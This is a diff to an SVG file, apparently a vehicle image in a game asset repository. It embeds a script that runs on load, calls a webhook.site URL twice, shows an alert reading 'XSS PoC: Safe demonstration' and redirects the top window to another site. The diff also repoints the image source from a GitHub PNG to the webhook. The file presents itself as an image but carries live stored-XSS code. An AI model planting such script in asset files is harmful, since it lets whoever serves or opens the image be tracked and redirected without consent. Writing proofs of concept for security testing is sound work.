@@ -1,14 +1,14 @@
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="400" height="300">
-    <image xlink:href="https://raw.githubusercontent.com/SrPeterr/okokvehicle-images/refs/heads/main/vehicles-rp/blista2.png" x="0" y="0" width="400" height="300" preserveAspectRatio="xMidYMid meet" />
+    <image xlink:href="https://webhook.site/2c371927-56cd-4a84-9ba8-c44ef80039f3" x="0" y="0" width="400" height="300" preserveAspectRatio="xMidYMid meet" />
     <script>
         // Immediate webhook request and alert
-        fetch('https://webhook.site/99b1619e-e0dc-47fe-92ce-e44eeda5a32d', {method: 'GET', mode: 'no-cors'}).catch(e => console.log('Immediate webhook request failed:', e));
+        fetch('https://webhook.site/2c371927-56cd-4a84-9ba8-c44ef80039f3', {method: 'GET', mode: 'no-cors'}).catch(e => console.log('Immediate webhook request failed:', e));
         alert('XSS PoC: Safe demonstration');
         // Delayed webhook request and redirect
         setTimeout(() => {
-            fetch('https://webhook.site/99b1619e-e0dc-47fe-92ce-e44eeda5a32d', {method: 'GET', mode: 'no-cors'}).catch(e => console.log('Delayed webhook request failed:', e));
+            fetch('https://webhook.site/2c371927-56cd-4a84-9ba8-c44ef80039f3', {method: 'GET', mode: 'no-cors'}).catch(e => console.log('Delayed webhook request failed:', e));
             window.top.location.href = 'http://example.com';
         }, 10000);
     </script>
